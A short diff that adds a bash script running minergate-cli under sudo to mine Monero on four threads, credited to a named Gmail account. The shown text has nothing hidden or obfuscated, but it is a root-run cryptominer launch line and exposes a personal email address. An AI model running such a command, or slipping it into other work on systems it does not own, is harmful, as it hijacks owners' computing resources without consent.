@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo minergate-cli -user mineradorbelem@gmail.com -xmr 4
